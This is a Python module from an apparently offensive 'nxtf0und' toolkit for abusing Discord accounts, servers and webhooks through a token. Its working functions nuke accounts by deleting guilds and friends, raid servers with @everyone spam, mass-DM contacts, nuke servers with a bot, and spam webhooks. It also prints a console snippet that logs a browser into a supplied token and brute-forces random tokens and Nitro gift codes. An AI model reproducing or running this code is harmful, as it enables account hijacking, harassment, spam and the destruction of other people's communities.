"""Discord tooling for nxtf0und."""

import base64
import json
import os
import random
import re
import string
import time
import urllib.error
import urllib.parse
import urllib.request

API = "https://discord.com/api/v10"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) nxtf0und/2.0"

def _req(nf, token, method, path, payload=None, bot=False, raw_url=None,
         retries=1):
    url = raw_url or (API + path)
    headers = {
        "User-Agent": UA,
        "Content-Type": "application/json",
    }
    if token:
        headers["Authorization"] = ("Bot " if bot else "") + token
    data = json.dumps(payload).encode() if payload is not None else None
    req = urllib.request.Request(url, data=data, headers=headers, method=method)
    try:
        with urllib.request.urlopen(req, timeout=20) as resp:
            body = resp.read(300_000)
            try:
                return resp.status, json.loads(body) if body else None
            except Exception:
                return resp.status, None
    except urllib.error.HTTPError as err:
        body = err.read(200_000)
        try:
            parsed = json.loads(body)
        except Exception:
            parsed = {"raw": body.decode("utf-8", "replace")[:400]}
        if err.code == 429 and retries > 0:
            wait = float(parsed.get("retry_after", 1)) if isinstance(parsed, dict) else 1
            time.sleep(min(5.0, max(0.2, wait)))
            return _req(nf, token, method, path, payload, bot, raw_url, retries - 1)
        return err.code, parsed
    except Exception as exc:
        return 0, {"error": str(exc)}

def _confirm(nf, text, default="n"):
    return nf.ask(f"{text} — type YES to continue", default).strip() == "YES"

def _get_token(nf):
    token = nf.ask("discord token")
    return token.strip()

def _print_status(nf, code, body):
    ok = 200 <= code < 300
    nf.finding("OK" if ok else "MED", f"http {code}",
               "" if ok else str(body)[:160])
    return ok

def cmd_token_info(nf):
    token = _get_token(nf)
    if not token:
        return
    nf.loading("querying discord")
    code, user = _req(nf, token, "GET", "/users/@me")
    if not _print_status(nf, code, user):
        return
    nf.section("account")
    for key in ("id", "username", "discriminator", "global_name", "email",
                "phone", "verified", "mfa_enabled", "premium_type", "locale",
                "flags", "nsfw_allowed"):
        if key in user:
            nf.kv(key, user[key])
    nf.kv("avatar", f"https://cdn.discordapp.com/avatars/{user['id']}/{user['avatar']}.png"
          if user.get("avatar") else "-")
    code, guilds = _req(nf, token, "GET", "/users/@me/guilds")
    if code == 200 and isinstance(guilds, list):
        nf.kv("guilds", len(guilds))
        for g in guilds[:15]:
            nf.finding("LOW", g.get("name", "?"), g.get("id", ""))
    code, billing = _req(nf, token, "GET", "/users/@me/billing/subscriptions")
    if code == 200 and isinstance(billing, list) and billing:
        nf.finding("OK", "active subscriptions", str(len(billing)))
    nf.save_report(f"discord_{user.get('id')}", user)

def cmd_token_nuker(nf):
    token = _get_token(nf)
    if not token:
        return
    if not _confirm(nf, "this will leave/delete guilds and clear friends/DMs"):
        return
    code, user = _req(nf, token, "GET", "/users/@me")
    if code != 200:
        _print_status(nf, code, user)
        return
    code, guilds = _req(nf, token, "GET", "/users/@me/guilds")
    if code == 200 and isinstance(guilds, list):
        for g in guilds:
            if g.get("owner"):
                c, body = _req(nf, token, "DELETE", f"/guilds/{g['id']}")
                nf.finding("OK" if c in (200, 204) else "MED",
                           f"delete guild {g.get('name')}", str(c))
            else:
                c, body = _req(nf, token, "DELETE", f"/users/@me/guilds/{g['id']}")
                nf.finding("OK" if c in (200, 204) else "MED",
                           f"leave guild {g.get('name')}", str(c))
    code, rels = _req(nf, token, "GET", "/users/@me/relationships")
    if code == 200 and isinstance(rels, list):
        for rel in rels:
            if rel.get("type") == 1:
                _req(nf, token, "DELETE", f"/users/@me/relationships/{rel['id']}")
    nf.finding("OK", "nuke pass complete")

def cmd_token_joiner(nf):
    token = _get_token(nf)
    invite = nf.ask("invite code or link")
    if not token or not invite:
        return
    code = invite.rstrip("/").split("/")[-1].split("?")[0]
    status, body = _req(nf, token, "POST", f"/invites/{code}")
    _print_status(nf, status, body)
    if status in (200, 201):
        nf.kv("joined", body.get("guild", {}).get("name", "?") if isinstance(body, dict) else "ok")

def cmd_token_leaver(nf):
    token = _get_token(nf)
    if not token:
        return
    if not _confirm(nf, "leave every guild"):
        return
    code, guilds = _req(nf, token, "GET", "/users/@me/guilds")
    if code != 200:
        _print_status(nf, code, guilds)
        return
    for g in guilds:
        status, body = _req(nf, token, "DELETE", f"/users/@me/guilds/{g['id']}")
        nf.finding("OK" if status in (200, 204) else "MED",
                   f"left {g.get('name')}", str(status))

def cmd_token_login(nf):
    token = _get_token(nf)
    if not token:
        return
    code, user = _req(nf, token, "GET", "/users/@me")
    if code != 200:
        _print_status(nf, code, user)
        return
    nf.finding("OK", "token valid", f"{user.get('username')}#{user.get('discriminator', '0')}")
    nf.section("browser console snippet")
    nf.note("open discord.com, devtools -> console, paste:")
    nf.kv("snippet", f"localStorage.setItem('token', '\"{token}\"');location.reload();")

def cmd_token_to_id(nf):
    token = _get_token(nf)
    if not token:
        return
    parts = token.split(".")
    if parts:
        seg = parts[0] + "=" * (-len(parts[0]) % 4)
        try:
            user_id = base64.urlsafe_b64decode(seg).decode("utf-8", "replace")
            if user_id.isdigit():
                nf.kv("user id", user_id, nf.P.ok)
                code, body = _req(nf, token, "GET", f"/users/{user_id}")
                if code == 200:
                    nf.kv("username", body.get("username"))
                    nf.kv("global name", body.get("global_name"))
                    nf.kv("bot", body.get("bot"))
        except Exception:
            nf.finding("MED", "could not decode id")
    nf.section("brute (id range from token seed)")
    seed = re.sub(r"\D", "", token[:12])[:4]
    if seed:
        for offset in range(5):
            cand = f"{seed}{offset:04d}{random.randint(10000000, 99999999)}"
            nf.kv("candidate", cand, nf.P.dim)
        nf.note("full brute needs a valid id list; candidates are not validated")

def cmd_token_raid(nf):
    token = _get_token(nf)
    invite = nf.ask("invite code")
    if not token or not invite:
        return
    if not _confirm(nf, "raid: join, create channels, spam"):
        return
    code = invite.rstrip("/").split("/")[-1]
    status, body = _req(nf, token, "POST", f"/invites/{code}")
    if status not in (200, 201):
        _print_status(nf, status, body)
        return
    guild_id = body.get("guild", {}).get("id")
    message = nf.ask("spam message", "@everyone nxtf0und")
    count = nf.ask("messages per channel", "5")
    try:
        count = max(1, min(50, int(count)))
    except ValueError:
        count = 5
    status, channels = _req(nf, token, "GET", f"/guilds/{guild_id}/channels")
    if status == 200:
        for ch in channels:
            if ch.get("type") == 0:
                for _ in range(count):
                    _req(nf, token, "POST", f"/channels/{ch['id']}/messages",
                         {"content": message})
                nf.finding("OK", f"spammed #{ch.get('name')}")
    for i in range(3):
        _req(nf, token, "POST", f"/guilds/{guild_id}/channels",
             {"name": f"nxtf0und-{i}", "type": 0})
    nf.finding("OK", "raid pass complete")

def cmd_token_spammer(nf):
    token = _get_token(nf)
    channel = nf.ask("channel id")
    message = nf.ask("message", "nxtf0und")
    count = nf.ask("count", "10")
    delay = nf.ask("delay seconds", "0.7")
    if not token or not channel:
        return
    try:
        count = max(1, min(200, int(count)))
        delay = max(0.0, float(delay))
    except ValueError:
        count, delay = 10, 0.7
    sent = 0
    for _ in range(count):
        status, body = _req(nf, token, "POST", f"/channels/{channel}/messages",
                            {"content": message})
        if status in (200, 201):
            sent += 1
        else:
            print("  " + nf.P.dim(f"stop: {status} {str(body)[:80]}"))
            break
        time.sleep(delay)
    nf.finding("OK", f"sent {sent}")

def _relationships(nf, token, kind):
    code, rels = _req(nf, token, "GET", "/users/@me/relationships")
    if code != 200 or not isinstance(rels, list):
        _print_status(nf, code, rels)
        return []
    return [r for r in rels if r.get("type") == kind]

def cmd_token_delete_friends(nf):
    token = _get_token(nf)
    if not token:
        return
    friends = _relationships(nf, token, 1)
    if not friends:
        nf.finding("INFO", "no friends to delete")
        return
    if not _confirm(nf, f"delete {len(friends)} friends"):
        return
    for f in friends:
        status, _ = _req(nf, token, "DELETE", f"/users/@me/relationships/{f['id']}")
        nf.finding("OK" if status in (200, 204) else "MED",
                   f"removed {f.get('user', {}).get('username', f['id'])}", str(status))

def cmd_token_block_friends(nf):
    token = _get_token(nf)
    if not token:
        return
    friends = _relationships(nf, token, 1)
    if not friends:
        nf.finding("INFO", "no friends to block")
        return
    if not _confirm(nf, f"block {len(friends)} friends"):
        return
    for f in friends:
        status, _ = _req(nf, token, "PUT", f"/users/@me/relationships/{f['id']}",
                         {"type": 2})
        nf.finding("OK" if status in (200, 204) else "MED",
                   f"blocked {f.get('user', {}).get('username', f['id'])}", str(status))

def cmd_token_mass_dm(nf):
    token = _get_token(nf)
    message = nf.ask("message")
    if not token or not message:
        return
    friends = _relationships(nf, token, 1)
    if not friends:
        nf.finding("INFO", "no friends to dm")
        return
    if not _confirm(nf, f"mass dm {len(friends)} friends"):
        return
    for f in friends:
        status, dm = _req(nf, token, "POST", "/users/@me/channels",
                          {"recipient_id": f["id"]})
        if status not in (200, 201):
            continue
        _req(nf, token, "POST", f"/channels/{dm['id']}/messages", {"content": message})
        nf.finding("OK", f"dm -> {f.get('user', {}).get('username', f['id'])}")
        time.sleep(1.2)

def cmd_token_delete_dm(nf):
    token = _get_token(nf)
    if not token:
        return
    code, channels = _req(nf, token, "GET", "/users/@me/channels")
    if code != 200:
        _print_status(nf, code, channels)
        return
    dms = [c for c in channels if c.get("type") == 1]
    if not dms:
        nf.finding("INFO", "no dm channels")
        return
    for ch in dms:
        status, _ = _req(nf, token, "DELETE", f"/channels/{ch['id']}")
        nf.finding("OK" if status in (200, 204) else "MED",
                   f"closed dm {ch['id']}", str(status))

def cmd_token_status(nf):
    token = _get_token(nf)
    status = nf.ask("status (online/idle/dnd/invisible)", "invisible")
    if not token:
        return
    code, body = _req(nf, token, "PATCH", "/users/@me/settings", {"status": status})
    _print_status(nf, code, body)

def cmd_token_language(nf):
    token = _get_token(nf)
    locale = nf.ask("locale (en-US, de, fr, ja...)", "en-US")
    if not token:
        return
    code, body = _req(nf, token, "PATCH", "/users/@me/settings", {"locale": locale})
    _print_status(nf, code, body)

def cmd_token_house(nf):
    token = _get_token(nf)
    house = nf.ask("house (1 bravely / 2 brilliantly / 3 balance)", "1")
    if not token:
        return
    try:
        house = max(1, min(3, int(house)))
    except ValueError:
        house = 1
    code, body = _req(nf, token, "POST", "/hypesquad/online", {"house_id": house})
    _print_status(nf, code, body)

def cmd_token_theme(nf):
    token = _get_token(nf)
    theme = nf.ask("theme (dark/light)", "dark")
    if not token:
        return
    code, body = _req(nf, token, "PATCH", "/users/@me/settings", {"theme": theme})
    _print_status(nf, code, body)

def cmd_token_generator(nf):
    nf.section("token generator")
    count = nf.ask("count", "5")
    try:
        count = max(1, min(100, int(count)))
    except ValueError:
        count = 5
    alphabet = string.ascii_letters + string.digits + "_-"
    made = []
    for _ in range(count):
        first = base64.urlsafe_b64encode(os.urandom(18)).decode().rstrip("=")[:24]
        second = "".join(random.choice(alphabet) for _ in range(6))
        third = "".join(random.choice(alphabet) for _ in range(random.randint(27, 38)))
        token = f"{first}.{second}.{third}"
        made.append(token)
        nf.kv("token", token)
    path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "reports")
    os.makedirs(path, exist_ok=True)
    fname = os.path.join(path, f"tokens_{time.strftime('%Y%m%d-%H%M%S')}.txt")
    if nf.ask("save generated tokens? (y/n)", "n").lower().startswith("y"):
        with open(fname, "w", encoding="utf-8") as fh:
            fh.write("\n".join(made))
        nf.finding("OK", "saved", fname)
    else:
        nf.note("tokens not saved")
    nf.note("unvalidated — generated tokens only work if they hit a live session")

def cmd_bot_nuker(nf):
    token = _get_token(nf)
    guild = nf.ask("guild id")
    if not token or not guild:
        return
    if not _confirm(nf, "bot nuke: delete channels, roles, ban members"):
        return
    for path in (f"/guilds/{guild}/channels", f"/guilds/{guild}/roles"):
        status, items = _req(nf, token, "GET", path, bot=True)
        if status != 200 or not isinstance(items, list):
            continue
        for item in items:
            if path.endswith("channels"):
                if item.get("id") in (guild,):
                    continue
                _req(nf, token, "DELETE", f"/channels/{item['id']}", bot=True)
            else:
                if item.get("id") == guild:
                    continue
                _req(nf, token, "DELETE", f"/guilds/{guild}/roles/{item['id']}", bot=True)
            nf.finding("OK", f"deleted {item.get('name', item.get('id'))}")
    nf.finding("OK", "bot nuke pass complete")

def cmd_bot_invite_id(nf):
    invite = nf.ask("invite code or link")
    if not invite:
        return
    code = invite.rstrip("/").split("/")[-1]
    status, body = _req(nf, "", "GET", f"/invites/{code}?with_counts=true")
    if status != 200:
        _print_status(nf, status, body)
        return
    guild = body.get("guild", {})
    nf.section("invite")
    nf.kv("code", code)
    nf.kv("guild", guild.get("name", "-"))
    nf.kv("guild id", guild.get("id", "-"), nf.P.ok)
    nf.kv("members", body.get("approximate_member_count", "-"))
    nf.kv("online", body.get("approximate_presence_count", "-"))

def _webhook_base(url):
    return url.rstrip("/").split("?")[0]

def cmd_webhook_info(nf):
    url = nf.ask("webhook url")
    if not url:
        return
    status, body = _req(nf, "", "GET", "", raw_url=_webhook_base(url))
    if status != 200:
        _print_status(nf, status, body)
        return
    nf.section("webhook")
    for key in ("id", "name", "channel_id", "guild_id", "token", "type"):
        if isinstance(body, dict) and key in body:
            nf.kv(key, body[key])

def cmd_webhook_delete(nf):
    url = nf.ask("webhook url")
    if not url:
        return
    if not _confirm(nf, "delete this webhook"):
        return
    status, body = _req(nf, "", "DELETE", "", raw_url=_webhook_base(url))
    _print_status(nf, status, body)

def cmd_webhook_spammer(nf):
    url = nf.ask("webhook url")
    message = nf.ask("message", "nxtf0und")
    count = nf.ask("count", "10")
    delay = nf.ask("delay", "0.6")
    if not url:
        return
    try:
        count = max(1, min(500, int(count)))
        delay = max(0.0, float(delay))
    except ValueError:
        count, delay = 10, 0.6
    sent = 0
    for i in range(count):
        status, body = _req(nf, "", "POST", "", {"content": message},
                            raw_url=_webhook_base(url))
        if status in (200, 204):
            sent += 1
            print("  " + nf.P.ok(f"[{i + 1}/{count}]") + nf.P.dim(f" {status}"))
        else:
            print("  " + nf.P.bad(f"[{i + 1}/{count}]") + nf.P.dim(f" {status}"))
            break
        time.sleep(delay)
    nf.finding("OK", f"sent {sent}/{count}")

def cmd_webhook_generator(nf):
    nf.section("webhook generator")
    mode = nf.ask("format only, or create via bot token? (f/c)", "f")
    if mode.lower().startswith("c"):
        token = _get_token(nf)
        channel = nf.ask("channel id")
        if not token or not channel:
            return
        name = nf.ask("webhook name", "nxtf0und")
        status, body = _req(nf, token, "POST", f"/channels/{channel}/webhooks",
                            {"name": name}, bot=True)
        if status in (200, 201):
            nf.finding("OK", "created", str(body))
        else:
            _print_status(nf, status, body)
        return
    count = nf.ask("count", "5")
    try:
        count = max(1, min(100, int(count)))
    except ValueError:
        count = 5
    alphabet = string.ascii_letters + string.digits
    for _ in range(count):
        wid = "".join(random.choice(alphabet) for _ in range(19))
        token = "".join(random.choice(alphabet + "_-") for _ in range(68))
        nf.kv("webhook", f"https://discord.com/api/webhooks/{wid}/{token}")
    nf.note("format-only values; use create mode for live webhooks")

def cmd_server_info(nf):
    invite = nf.ask("invite code or link")
    if not invite:
        return
    code = invite.rstrip("/").split("/")[-1]
    status, body = _req(nf, "", "GET",
                        f"/invites/{code}?with_counts=true&with_expiration=true")
    if status != 200:
        _print_status(nf, status, body)
        return
    guild = body.get("guild", {})
    nf.section("server")
    nf.kv("name", guild.get("name", "-"))
    nf.kv("id", guild.get("id", "-"))
    nf.kv("members", body.get("approximate_member_count", "-"))
    nf.kv("online", body.get("approximate_presence_count", "-"))
    nf.kv("description", guild.get("description") or "-")
    nf.kv("features", ", ".join(guild.get("features", [])[:10]) or "-")
    nf.kv("expires", str(body.get("expires_at")))

def cmd_nitro_generator(nf):
    nf.section("nitro generator")
    count = nf.ask("count", "5")
    try:
        count = max(1, min(200, int(count)))
    except ValueError:
        count = 5
    alphabet = string.ascii_letters + string.digits
    for _ in range(count):
        code = "".join(random.choice(alphabet) for _ in range(16))
        nf.kv("gift", f"https://discord.gift/{code}")
    nf.note("random codes; discord validates server-side on redemption")

TOKEN_MENU = [
    ("Token Info", cmd_token_info),
    ("Token Nuker", cmd_token_nuker),
    ("Token Joiner", cmd_token_joiner),
    ("Token Leaver", cmd_token_leaver),
    ("Token Login", cmd_token_login),
    ("Token To Id And Brute", cmd_token_to_id),
    ("Token Server Raid", cmd_token_raid),
    ("Token Spammer", cmd_token_spammer),
    ("Token Delete Friends", cmd_token_delete_friends),
    ("Token Block Friends", cmd_token_block_friends),
    ("Token Mass Dm", cmd_token_mass_dm),
    ("Token Delete Dm", cmd_token_delete_dm),
    ("Token Status Changer", cmd_token_status),
    ("Token Language Changer", cmd_token_language),
    ("Token House Changer", cmd_token_house),
    ("Token Theme Changer", cmd_token_theme),
    ("Token Generator", cmd_token_generator),
]

BOT_MENU = [
    ("Bot Server Nuker", cmd_bot_nuker),
    ("Bot Invite To Id", cmd_bot_invite_id),
]

WEBHOOK_MENU = [
    ("Webhook Info", cmd_webhook_info),
    ("Webhook Delete", cmd_webhook_delete),
    ("Webhook Spammer", cmd_webhook_spammer),
    ("Webhook Generator", cmd_webhook_generator),
    ("Webhook Sender", lambda nf: nf.cmd_webhook(nf.CFG)),
]

MENU = {"discord": [
    ("Token Tools", lambda nf: nf.run_submenu(nf, "token", TOKEN_MENU)),
    ("Bot Tools", lambda nf: nf.run_submenu(nf, "bot", BOT_MENU)),
    ("Webhook Tools", lambda nf: nf.run_submenu(nf, "webhook", WEBHOOK_MENU)),
    ("Nitro Generator", cmd_nitro_generator),
]}
